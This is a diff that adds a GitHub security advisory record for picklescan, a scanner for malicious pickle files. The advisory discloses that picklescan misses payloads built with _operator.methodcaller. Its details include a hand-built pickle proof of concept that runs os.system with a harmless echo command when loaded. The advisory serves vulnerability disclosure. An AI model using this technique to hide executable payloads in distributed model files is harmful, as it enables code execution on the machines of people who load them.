@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-955r-x9j8-7rhh",
+  "modified": "2025-12-30T15:24:26Z",
+  "published": "2025-12-30T15:22:31Z",
+  "aliases": [],
+  "summary": "Picklescan is vulnerable to RCE via missing detection when calling built-in python _operator.methodcaller",
+  "details": "### Summary\nPicklescan uses  _operator.methodcaller, which is a built-in python library function to execute remote pickle files.\n\n### Details\nThe attack payload executes in the following steps:\n\n- First, the attacker crafts the payload by calling to _operator.methodcaller function in reduce method\n- Then when after the victim after checks whether or not the pickle file is safe by using Picklescan library and the library doesn't dectect any dangerous functions, pickle.load()  loads this malicious pickle file, thus lead to remote code execution.\n\n### PoC\n```\nimport pickle\nimport pickletools\nopcode2 = b'''cbuiltins\n__import__\n(Vos\ntRp0\n0c_operator\nmethodcaller\n(Vsystem\nVecho \"pwned by _operator.methodcaller\"\ntR(g0\ntR.'''\npickletools.dis(opcode2)\npickle.loads(opcode2)\n```\nThis PoC can't be easily create by pickle.dumps, so it was manually built. \n\n### Impact\nAny organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\nAttackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\nAttackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Report by\nPinji Chen (cpj24@mails.tsinghua.edu.cn) from NISL lab (https://netsec.ccert.edu.cn/about) at Tsinghua University, Guanheng Liu (coolwind326@gmail.com).",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "picklescan"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.34"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/mmaitre314/picklescan/security/advisories/GHSA-955r-x9j8-7rhh"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/mmaitre314/picklescan/commit/f2dea43e0c838e09ace1e62994143254b51de927"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/mmaitre314/picklescan"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/mmaitre314/picklescan/releases/tag/v0.0.34"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-502",
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-12-30T15:22:31Z",
+    "nvd_published_at": null
+  }
+}
